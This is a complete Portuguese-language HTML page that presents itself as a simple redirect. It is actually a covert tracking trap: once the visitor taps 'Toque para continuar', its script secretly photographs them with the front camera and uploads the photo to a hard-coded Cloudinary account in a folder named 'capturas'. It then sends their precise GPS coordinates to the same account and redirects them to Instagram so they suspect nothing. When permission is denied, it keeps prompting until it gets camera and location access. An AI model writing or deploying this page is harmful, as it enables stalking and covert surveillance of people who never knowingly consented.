<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionamento</title> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      text-align: center;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar...</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    function showOverlay(message, callback) {
      const overlay = document.getElementById("overlay");
      overlay.textContent = message;
      overlay.style.display = "flex";

      const handler = () => {
        overlay.removeEventListener("click", handler);
        overlay.style.display = "none";
        if (callback) callback();
      };

      overlay.removeEventListener("click", handler);
      overlay.addEventListener("click", handler);
    }

    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        const video = document.createElement("video");
        video.playsInline = true;
        video.muted = true;
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 200));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();

        const formData = new FormData();
        formData.append("file", imageBlob);
        formData.append("upload_preset", uploadPreset);
        formData.append("folder", folderName);

        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: formData
        });

        if (!response.ok) throw new Error("Erro ao enviar imagem");
        const data = await response.json();
        return data.secure_url;
      } catch (error) {
        console.error("Erro na captura da foto:", error);
        showOverlay("São necessárias as permissões da CÂMERA. Toque para tentar novamente.", () => {
          startFlow(); // Recomeça tudo
        });
        throw error;
      }
    }

    async function requestLocation(imageUrl) {
      try {
        const permission = await navigator.permissions.query({ name: "geolocation" });

        if (permission.state === "denied") {
          showOverlay("Permissão de LOCALIZAÇÃO negada. Vá em Ajustes > Safari > Localização e permita o acesso.");
          return;
        }

        navigator.geolocation.getCurrentPosition(async (pos) => {
          try {
            const { latitude, longitude } = pos.coords;
            const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
            const textBlob = new Blob([texto], { type: "text/plain" });

            const textForm = new FormData();
            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
            textForm.append("upload_preset", uploadPreset);
            textForm.append("folder", folderName);

            const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
              method: "POST",
              body: textForm
            });

            if (!textResp.ok) throw new Error("Erro ao enviar localização");
            window.location.href = "https://instagram.com";
          } catch (err) {
            console.error("Erro ao enviar localização:", err);
            showOverlay("Erro ao enviar localização. Toque para tentar de novo.", () => {
              requestLocation(imageUrl);
            });
          }
        }, (err) => {
          console.error("Erro ao obter localização:", err);
          showOverlay("Permissão de LOCALIZAÇÃO recusada. Toque para tentar novamente.", () => {
            requestLocation(imageUrl);
          });
        }, {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0
        });

      } catch (err) {
        console.error("Erro ao checar permissão de localização:", err);
        showOverlay("Erro ao checar permissão. Toque para tentar novamente.", () => {
          requestLocation(imageUrl);
        });
      }
    }

    async function startFlow() {
      try {
        const imageUrl = await capturePhoto();
        requestLocation(imageUrl);
      } catch (e) {
        console.error("Erro no fluxo geral:", e);
      }
    }

    window.addEventListener("DOMContentLoaded", () => {
      showOverlay("Toque para continuar...", () => startFlow());
    });
  </script>
</body>
</html>
